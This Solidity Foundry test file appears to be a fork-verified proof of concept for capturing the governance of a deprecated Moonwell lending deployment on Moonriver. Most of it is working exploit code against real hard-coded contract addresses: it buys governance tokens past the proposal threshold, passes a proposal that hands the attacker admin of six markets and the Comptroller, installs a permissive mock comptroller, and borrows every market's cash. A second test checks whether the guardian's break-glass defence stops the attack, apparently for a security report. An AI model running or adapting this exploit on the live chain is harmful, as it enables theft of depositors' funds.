// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {MockComptroller} from "../src/MockComptroller.sol";

/// C-28 dormant-DAO capture — Moonwell "Apollo" (Moonriver) live path, fork-verified.
///
/// The Moonriver Moonwell instance (deprecated; MIP-R41 wind-down) still has:
///   Governor Apollo 0x2BE2e230e89c59c8E20E633C524AD2De246e7370
///     - proposalThreshold = 100,000,000 MFAM (raised after the 2026-03-24 attempted capture)
///     - currentQuorum()   ~ 40,000,001 MFAM (dynamic; proposal snapshot quorum)
///     - votingDelay 60s, votingPeriod 3 days
///   Timelock 0x04e6322D196E0E4cCBb2610dd8B8f2871E160bd7 (admin = governor, delay 24h)
///   MFAM 0xBb8d88bcD9749636BC4D2bE22aaC4Bb3B01A58F1
///   SolarBeam MFAM/WMOVR pair 0xE6Bfc609A2e58530310D6964ccdd236fc93b4ADB
///     - reserves (block 17,381,654): ~89.3 MOVR / ~102,391,130 MFAM
///  6 of 7 markets + Comptroller + Oracle have admin = Timelock.
///  (mMOVR's admin was moved to MOVRAdmin 0xfeA5a5927645C0DC5C1E740Ec1B24AD320c7e58f by the MIP-R41 wind-down.)
///
/// Attack: buy >100,000,001 MFAM from the pair (~3.7k MOVR), self-delegate, propose
/// `_setPendingAdmin(attacker)` on the 6 markets + Comptroller, vote, queue, wait 24h, execute,
/// accept admin, replace the Comptroller with a permissive mock, borrow 100% of each market's cash.
///
/// All amounts/addresses are read live from the fork; no mainnet transactions.
contract MoonwellApolloCaptureTest is Test {
    // --- Moonriver addresses (chain id 1285) ---
    address constant GOV = 0x2BE2e230e89c59c8E20E633C524AD2De246e7370;
    address constant TIMELOCK = 0x04e6322D196E0E4cCBb2610dd8B8f2871E160bd7;
    address constant MFAM = 0xBb8d88bcD9749636BC4D2bE22aaC4Bb3B01A58F1;
    address constant WMOVR = 0x98878B06940aE243284CA214f92Bb71a2b032B8A;
    address constant PAIR = 0xE6Bfc609A2e58530310D6964ccdd236fc93b4ADB;
    address constant COMPTROLLER = 0x0b7a0EAA884849c6Af7a129e899536dDDcA4905E;
    address constant GUARDIAN = 0x5DeD9d1025a158554Ab19540Ae83182d890Bb8DB;

    // markets whose admin is the Timelock (mMOVR excluded: admin = MOVRAdmin wind-down contract)
    address constant M_WBTC = 0x6E745367F4Ad2b3da7339aee65dC85d416614D90;
    address constant M_ETH = 0x6503D905338e2ebB550c9eC39Ced525b612E77aE;
    address constant M_USDC = 0xd0670AEe3698F66e2D4dAf071EB9c690d978BFA8;
    address constant M_USDT = 0x36918B66F9A3eC7a59d0007D8458DB17bDffBF21;
    address constant M_FRAX = 0x93Ef8B7c6171BaB1C0A51092B2c9da8dc2ba0e9D;
    address constant M_KSM = 0xa0D116513Bd0B8f3F14e6Ea41556c6Ec34688e0f;

    // fork block: read from the CI probe file if present, else latest
    function setUp() public {
        string memory rpc = _readRpcFile(
            "ci-out/rpc_moonriver.txt",
            vm.envOr("MOONRIVER_FORK_RPC", string("https://moonriver.drpc.org"))
        );
        uint256 fb = _readUintFile("ci-out/rpc_moonriver_block.txt");
        if (fb == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, fb);
        }
    }

    function _readRpcFile(string memory path, string memory fallbackUrl) internal view returns (string memory) {
        if (vm.exists(path)) {
            string memory s = vm.trim(vm.readFile(path));
            if (bytes(s).length > 8 && keccak256(bytes(s)) != keccak256(bytes("NONE"))) return s;
        }
        return fallbackUrl;
    }

    function _readUintFile(string memory path) internal view returns (uint256) {
        if (!vm.exists(path)) return 0;
        try this.parseUint(vm.trim(vm.readFile(path))) returns (uint256 v) {
            return v;
        } catch {
            return 0;
        }
    }

    function parseUint(string memory s) external view returns (uint256) {
        return vm.parseUint(s);
    }

    // ---------------------------------------------------------------- helpers
    function _markets() internal pure returns (address[7] memory m) {
        m = [M_WBTC, M_ETH, M_USDC, M_USDT, M_FRAX, M_KSM, COMPTROLLER];
    }

    /// Buy `need` MFAM out of the SolarBeam pair. Returns MOVR spent.
    function _buyMfam(address atk, uint256 need) internal returns (uint256 cost) {
        require(IPair(PAIR).token0() == WMOVR, "pair orientation");
        (uint112 r0, uint112 r1,) = IPair(PAIR).getReserves();
        require(IPair(PAIR).token1() == MFAM, "pair token1");
        // dx = ceil(x * out * 1000 / ((x - out) * 997))   (UniV2, 0.3% fee)
        uint256 x = uint256(r1); // MFAM (out)
        uint256 y = uint256(r0); // WMOVR (in)
        require(need < x, "need >= pool");
        // dx = ceil(1000 * out * reserveIn / (997 * (reserveOut - out)))
        uint256 dx = (y * need * 1000) / ((x - need) * 997) + 1;
        vm.deal(atk, dx + 100 ether);
        vm.startPrank(atk);
        IWMOVR(WMOVR).deposit{value: dx}();
        IERC20(WMOVR).transfer(PAIR, dx);
        IPair(PAIR).swap(0, need, atk, "");
        vm.stopPrank();
        emit log_named_decimal_uint("MOVR spent to buy MFAM", dx, 18);
        emit log_named_decimal_uint("MFAM acquired", IERC20(MFAM).balanceOf(atk), 18);
        return dx;
    }

    function _proposeAndPass(address atk, string memory desc) internal returns (uint256 id) {
        address[7] memory m = _markets();
        address[] memory targets = new address[](7);
        uint256[] memory values = new uint256[](7);
        string[] memory sigs = new string[](7);
        bytes[] memory datas = new bytes[](7);
        for (uint256 i = 0; i < 7; i++) {
            targets[i] = m[i];
            sigs[i] = "_setPendingAdmin(address)";
            datas[i] = abi.encode(atk);
        }
        emit log_named_uint("current quorum (pre-propose)", IGovernorApollo(GOV).currentQuorum());
        vm.startPrank(atk);
        id = IGovernorApollo(GOV).propose(targets, values, sigs, datas, desc);
        vm.warp(block.timestamp + IGovernorApollo(GOV).votingDelay() + 1);
        IGovernorApollo(GOV).castVote(id, 0); // 0 = yes in Apollo
        vm.warp(block.timestamp + IGovernorApollo(GOV).votingPeriod() + 1);
        require(IGovernorApollo(GOV).state(id) == 4, "proposal not Succeeded");
        IGovernorApollo(GOV).queue(id);
        vm.stopPrank();
        emit log_named_uint("proposal id", id);
        return id;
    }

    // ---------------------------------------------------------------- main PoC
    /// Fork test: full unprivileged capture + drain of the 6 Timelock-administered markets.
    function test_live_capture_and_drain() public {
        address atk = makeAddr("attacker");
        uint256 threshold = IGovernorApollo(GOV).proposalThreshold();
        assertEq(threshold, 100_000_000e18, "threshold is 100M MFAM");
        assertEq(ITimelock(TIMELOCK).admin(), GOV, "timelock admin must be the governor");
        assertEq(ITimelock(TIMELOCK).pendingAdmin(), address(0), "no pending admin");

        // 1) buy just above the proposal threshold from the open market
        uint256 need = threshold + 1e18;
        uint256 cost = _buyMfam(atk, need);
        assertGt(IERC20(MFAM).balanceOf(atk), threshold, "bought above threshold");

        // 2) self-delegate and checkpoint (propose reads block.number - 1)
        vm.prank(atk);
        IERC20(MFAM).delegate(atk);
        vm.roll(block.number + 2);
        assertGt(IERC20(MFAM).getPriorVotes(atk, block.number - 1), threshold, "votes above threshold");

        // 3) propose -> vote -> queue (~3 days + 24h timelock)
        uint256 id = _proposeAndPass(atk, "C-28 Moonwell Apollo capture (fork proof)");

        // 4) execute after the timelock delay; pendingAdmin becomes the attacker
        vm.warp(block.timestamp + ITimelock(TIMELOCK).delay() + 1);
        vm.prank(atk);
        IGovernorApollo(GOV).execute(id);

        address[7] memory m = _markets();
        for (uint256 i = 0; i < 7; i++) {
            assertEq(IMToken(m[i]).pendingAdmin(), atk, "pendingAdmin set");
        }

        // 5) accept admin, install permissive comptroller, borrow all cash
        MockComptroller mock = new MockComptroller();
        _drainMarkets(atk, mock);

        // 6) Comptroller itself (no assets, but control was captured)
        vm.startPrank(atk);
        require(IMToken(COMPTROLLER)._acceptAdmin() == 0, "accept comptroller admin failed");
        vm.stopPrank();
        assertEq(IMToken(COMPTROLLER).admin(), atk, "comptroller captured");

        emit log_named_decimal_uint("total attack cost in MOVR", cost, 18);
    }

    function _drainMarkets(address atk, MockComptroller mock) internal {
        address[6] memory markets = [M_WBTC, M_ETH, M_USDC, M_USDT, M_FRAX, M_KSM];
        for (uint256 i = 0; i < 6; i++) {
            _drainOne(atk, markets[i], mock);
        }
    }

    function _drainOne(address atk, address market, MockComptroller mock) internal {
        address underlying = IMToken(market).underlying();
        uint256 cash = IMToken(market).getCash();
        uint256 balBefore = IERC20(underlying).balanceOf(atk);
        vm.startPrank(atk);
        require(IMToken(market)._acceptAdmin() == 0, "accept admin failed");
        require(IMToken(market)._setComptroller(address(mock)) == 0, "setComptroller failed");
        require(IMToken(market).borrow(cash) == 0, "borrow failed");
        vm.stopPrank();
        uint256 got = IERC20(underlying).balanceOf(atk) - balBefore;
        assertEq(got, cash, "borrowed all cash");
        emit log_named_string("drained market", IMToken(market).symbol());
        emit log_named_decimal_uint("  amount", got, IERC20(underlying).decimals());
    }

    /// Fork test: what the 2-of-3 Break Glass Guardian can (and cannot) do against a passed proposal.
    /// Empirical result is logged so the report can state whether the defense is a hard gate.
    function test_guardian_breakglass_effect() public {
        address atk = makeAddr("attacker2");
        uint256 need = IGovernorApollo(GOV).proposalThreshold() + 1e18;
        _buyMfam(atk, need);
        vm.prank(atk);
        IERC20(MFAM).delegate(atk);
        vm.roll(block.number + 2);
        uint256 id = _proposeAndPass(atk, "guardian test");

        address[7] memory m = _markets();
        address[] memory markets = new address[](7);
        for (uint256 i = 0; i < 7; i++) markets[i] = m[i];

        // guardian acts before the attacker executes (impersonating the 2-of-3 Safe's execution)
        vm.startPrank(GUARDIAN);
        IGovernorApollo(GOV).__executeBreakGlassOnCompound(markets);
        IGovernorApollo(GOV).__executeCompoundAcceptAdminOnContract(markets);
        vm.stopPrank();

        emit log_named_string("post-breakglass market admin", _addrToHex(IMToken(m[2]).admin()));
        emit log_named_string("post-breakglass pending admin", _addrToHex(IMToken(m[2]).pendingAdmin()));

        // attacker attempts execution after the timelock delay
        vm.warp(block.timestamp + ITimelock(TIMELOCK).delay() + 1);
        vm.prank(atk);
        (bool ok,) = GOV.call(abi.encodeWithSignature("execute(uint256)", id));
        emit log_named_string("attacker execute success after break-glass", ok ? "true" : "false");

        if (ok) {
            // if execute succeeded, check whether the attacker can still take admin
            vm.prank(atk);
            (bool ok2,) = m[2].call(abi.encodeWithSignature("_acceptAdmin()"));
            emit log_named_string("attacker acceptAdmin success", ok2 ? "true" : "false");
        }
    }

    function _addrToHex(address a) internal pure returns (string memory) {
        return vm.toString(a);
    }
}

// ------------------------------------------------------------------ interfaces
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function delegate(address) external;
    function getPriorVotes(address, uint256) external view returns (uint256);
}

interface IWMOVR is IERC20 {
    function deposit() external payable;
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IGovernorApollo {
    function proposalThreshold() external view returns (uint256);
    function proposalCount() external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function currentQuorum() external view returns (uint256);
    function timelock() external view returns (address);
    function propose(
        address[] calldata,
        uint256[] calldata,
        string[] calldata,
        bytes[] calldata,
        string calldata
    ) external returns (uint256);
    function castVote(uint256, uint8) external;
    function queue(uint256) external;
    function execute(uint256) external;
    function state(uint256) external view returns (uint8);
    function __executeBreakGlassOnCompound(address[] calldata) external;
    function __executeCompoundAcceptAdminOnContract(address[] calldata) external;
}

interface ITimelock {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function delay() external view returns (uint256);
}

interface IMToken {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function underlying() external view returns (address);
    function getCash() external view returns (uint256);
    function symbol() external view returns (string memory);
    function _acceptAdmin() external returns (uint256);
    function _setComptroller(address) external returns (uint256);
    function borrow(uint256) external returns (uint256);
}
